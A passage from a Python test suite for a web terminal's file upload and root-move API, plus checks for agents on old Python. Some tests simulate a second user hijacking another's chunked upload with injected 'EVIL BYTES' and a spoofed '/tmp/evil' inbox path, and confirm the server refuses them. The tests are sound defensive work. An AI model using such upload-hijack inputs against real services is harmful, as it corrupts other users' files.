            check("M2 refused: " + what + " → 400 files.rootMoveBackslash",
                  r.status_code == 400 and r.json().get("code") == "files.rootMoveBackslash", (r.status_code, r.text[:120]))
        r = await owner.post(url, json={"dir": "/srv/x", "names": ["f%d" % i for i in range(21)]})
        check("more than 20 names → 422", r.status_code == 422, r.status_code)
        fake.inbox = "/tmp/evil"
        r = await owner.post(url, json={"dir": "/srv/x", "names": ["a"]})
        check("an unexpected inbox path from the agent → refused (no plan)",
              r.status_code == 400 and "plan_id" not in r.json(), r.text[:120])
        r = await owner.post("%s/%s/command" % (url, "0" * 32))
        check("an unknown plan id → 404", r.status_code == 404, r.status_code)
    finally:
        core.sources.pop(hid, None)


async def window_checks(owner, hid):
    """Re-review M1: the upload state (offset, CRC, lock, reorder window) is keyed by host, path AND
    upload_id, and a live upload belongs to the user who started it."""
    print("── upload state bound to the path and the user (re-review M1)")
    url = "/api/hosts/%d/fs/root-move" % hid
    fake = FakeAgent(hid, deny={"/srv/bin/lists"})
    core.sources[hid] = fake
    saved_wait = core.WINDOW_WAIT
    core.WINDOW_WAIT = 0.5
    up = "/api/hosts/%d/fs/upload" % hid
    try:
        await U.add_user("op-m1@x.co", bindings=[("operator", "all", "")])
        op = await U.login("op-m1@x.co")
        r = await owner.post(url, json={"dir": "/srv/bin/lists", "names": ["m1.conf"]})
        p = r.json()
        path = p["uploads"][0]["upload_path"]
        uid = "f" * 32
        data = b"planner bytes 0123456789\n"
        r = await owner.post("%s?path=%s&upload_id=%s&offset=0" % (up, path, uid), content=data[:7])
        check("M1: the planner's first chunk lands", r.status_code == 200, r.text[:120])

        # the attacker read the id from `<staged>.wtpart.<id>` in the inbox and sends a block AHEAD
        # of the planner's offset, for ANOTHER path: before the fix it sat in the planner's window
        # and was written into the staged file (and its hash) when the gap filled
        async def attack():
            return await op.post("%s?path=%s&upload_id=%s&offset=7" % (up, "/tmp/x", uid), content=b"EVIL BYTES")
        task = asyncio.ensure_future(attack())
        await asyncio.sleep(0.1)
        r1 = await owner.post("%s?path=%s&upload_id=%s&offset=7" % (up, path, uid), content=data[7:])
        r2 = await owner.post("%s/commit?path=%s&upload_id=%s" % (up, path, uid))
        ra = await task
        check("M1: same upload_id, another path → its block never joins the planner's upload (409)",
              ra.status_code == 409, (ra.status_code, ra.text[:120]))
        check("M1: the planner's upload completes", r1.status_code == 200 and r2.status_code == 200
              and r2.json().get("written") == len(data), (r1.text[:120], r2.text[:120]))
        r = await owner.post("%s/%s/command" % (url, p["plan_id"]))
        argv = shlex.split(r.json().get("command", ""))
        check("M1: the command carries the hash of the planner's bytes only",
              r.status_code == 200 and hashlib.sha256(data).hexdigest() in argv
              and str(len(data)) in argv, (r.status_code, argv[7:]))
        check("M1: the other path's state is separate from the staged file's",
              core._upload_key(hid, "/tmp/x", uid) != core._upload_key(hid, path, uid))

        # the same user, the same upload_id, two paths: two independent uploads
        ida = "8" * 32
        ra = await owner.post("%s?path=%s&upload_id=%s&offset=0" % (up, "/home/webterm/a.bin", ida), content=b"aaa")
        rb = await owner.post("%s?path=%s&upload_id=%s&offset=0" % (up, "/home/webterm/b.bin", ida), content=b"bbbb")
        ca = await owner.post("%s/commit?path=%s&upload_id=%s" % (up, "/home/webterm/a.bin", ida))
        cb = await owner.post("%s/commit?path=%s&upload_id=%s" % (up, "/home/webterm/b.bin", ida))
        check("M1: one upload_id on two paths → two separate uploads, each with its own bytes",
              ra.status_code == rb.status_code == 200 and ca.json().get("written") == 3
              and cb.json().get("written") == 4, (ra.text[:80], rb.text[:80], ca.text[:80], cb.text[:80]))

        # same path + same upload_id, another user: every step refused while the upload lives
        shared, uid2 = "/home/webterm/shared.bin", "9" * 32
        r = await owner.post("%s?path=%s&upload_id=%s&offset=0" % (up, shared, uid2), content=b"abc")
        check("M1: owner starts an upload", r.status_code == 200, r.text[:120])
        r = await op.post("%s?path=%s&upload_id=%s&offset=3" % (up, shared, uid2), content=b"EVIL")
        check("M1: another user's chunk into it → 409 files.uploadForeign",
              r.status_code == 409 and r.json().get("code") == "files.uploadForeign", (r.status_code, r.text[:120]))
        r = await op.post("%s?path=%s&upload_id=%s&offset=0" % (up, shared, uid2), content=b"abc")
        check("M1: …also at the current offset", r.status_code == 409 and r.json().get("code") == "files.uploadForeign",
              (r.status_code, r.text[:120]))
        r = await op.get("%s/status?path=%s&upload_id=%s" % (up, shared, uid2))
        check("M1: another user's status → 409 files.uploadForeign",
              r.status_code == 409 and r.json().get("code") == "files.uploadForeign", (r.status_code, r.text[:120]))
        r = await op.post("%s/commit?path=%s&upload_id=%s" % (up, shared, uid2))
        check("M1: another user's commit → 409", r.status_code == 409 and r.json().get("code") == "files.uploadForeign",
              (r.status_code, r.text[:120]))
        r = await op.delete("%s?path=%s&upload_id=%s" % (up, shared, uid2))
        check("M1: another user's abort → 409", r.status_code == 409 and r.json().get("code") == "files.uploadForeign",
              (r.status_code, r.text[:120]))
        check("M1: nothing of theirs landed", fake.sizes.get(core._upload_tmp(shared, uid2)) == 3, fake.sizes)

        # the owner resumes: status (the landed offset), the next chunk, commit
        r = await owner.get("%s/status?path=%s&upload_id=%s" % (up, shared, uid2))
        check("M1: same user, same path: status resumes at the landed offset",
              r.status_code == 200 and r.json().get("offset") == 3, r.text[:120])
        r = await owner.post("%s?path=%s&upload_id=%s&offset=3" % (up, shared, uid2), content=b"def")
        r2 = await owner.post("%s/commit?path=%s&upload_id=%s" % (up, shared, uid2))
        check("M1: same user resumes and commits", r.status_code == 200 and r2.status_code == 200
              and r2.json().get("written") == 6, (r.text[:120], r2.text[:120]))
        r = await op.post("%s?path=%s&upload_id=%s&offset=0" % (up, shared, uid2), content=b"new")
        check("M1: after the commit the id is free again (the state is gone)", r.status_code == 200, r.text[:120])
        await op.delete("%s?path=%s&upload_id=%s" % (up, shared, uid2))
    finally:
        core.WINDOW_WAIT = saved_wait
        core.sources.pop(hid, None)


async def python_checks(owner):
    print("── agents on Python < 3.6")
    hid = await U.add_host(owner, "mailer")
    core.agent_python_old.clear()
    core.note_agent_internal(hid, "'__exit__'")
    check("fingerprint '__exit__' (CPython 3.5 wording) → confirmed", core.agent_python_old.get(hid) == "confirmed")
    core.agent_python_old.clear()
    core.note_agent_internal(hid, "__enter__")
    check("fingerprint '__enter__' → confirmed", core.agent_python_old.get(hid) == "confirmed")
    core.note_agent_internal(hid + 1, "something else")
    check("another internal error is not a fingerprint", hid + 1 not in core.agent_python_old)
    core.agent_python_old.clear()
    for os_name, want in (("Ubuntu 16.04.7 LTS", True), ("Debian GNU/Linux 9 (stretch)", True),
                          ("Ubuntu 14.04.6 LTS", True), ("CentOS release 6.10 (Final)", True), ("CentOS Linux release 7.9.2009 (Core)", False),
                          ("Ubuntu 18.04.6 LTS", False), ("Debian GNU/Linux 10 (buster)", False),
                          ("Debian GNU/Linux 12 (bookworm)", False), ("Alpine Linux v3.20", False), (None, False)):
        check("OS hint %r → %s" % (os_name, want), core.os_has_old_python(os_name) == want)
    probe = core.note_agent_os(hid, {"system": {"os": "Ubuntu 16.04.7 LTS"}})
    check("diagnostics with an old OS → likely + probe requested",
          probe and core.agent_python_old.get(hid) == "likely")
    core.note_fs_ok(hid)
    check("a working fs_list settles it (fine)", core.agent_python_old.get(hid) == "fine")
    check("…and a later diagnostics push does not re-raise it",
          not core.note_agent_os(hid, {"system": {"os": "Ubuntu 16.04.7 LTS"}}) and core.agent_python_old.get(hid) == "fine")

    # the dispatcher tags internal errors and learns the fingerprint
    conn = core.AgentConnection.__new__(core.AgentConnection)
    conn.host_id = hid
    loop = asyncio.get_running_loop()
    fut = loop.create_future()
    conn._pending = {7: fut}
    core.agent_python_old.pop(hid, None)
    await conn._on_ctrl({"id": 7, "ok": False, "code": "internal", "msg": "'__exit__'"})
    res = fut.result()
    check("_on_ctrl: an `internal` reply is tagged 'agent internal error: …'",
          res["msg"] == "agent internal error: '__exit__'", res)
    check("_on_ctrl: …and marks the host confirmed", core.agent_python_old.get(hid) == "confirmed")

    # host JSON + System health
    r = await owner.get("/api/hosts")
    h = [x for x in r.json() if x["id"] == hid][0]
    check("/api/hosts: agent_python_old = confirmed", h.get("agent_python_old") == "confirmed", h.get("agent_python_old"))
    res = await syshealth.c_agents_python()
    check("health: confirmed → critical agents_python_old",
          res and res.severity == "critical" and res.key == "agents_python_old" and hid in res.hosts, res)
    core.agent_python_old[hid] = "likely"
    res = await syshealth.c_agents_python()
    check("health: only likely → warning", res and res.severity == "warning" and res.key == "agents_python_likely", res)
    core.agent_python_old[hid] = "fine"
    res = await syshealth.c_agents_python()
    check("health: settled → ok", res and res.severity == "ok", res)
    r = await owner.get("/api/hosts")
    h = [x for x in r.json() if x["id"] == hid][0]
    check("/api/hosts: 'fine' is not exposed", h.get("agent_python_old") is None)
    core.agent_python_old.clear()


async def main():
    pure_checks()
    shell_checks()
    await U.boot()
    owner, hid = await mapping_checks()
    await route_checks(owner, hid)
    await window_checks(owner, hid)
    await python_checks(owner)
    await db.close()
    return check.summary()


if __name__ == "__main__":
    sys.exit(0 if asyncio.run(main()) else 1)
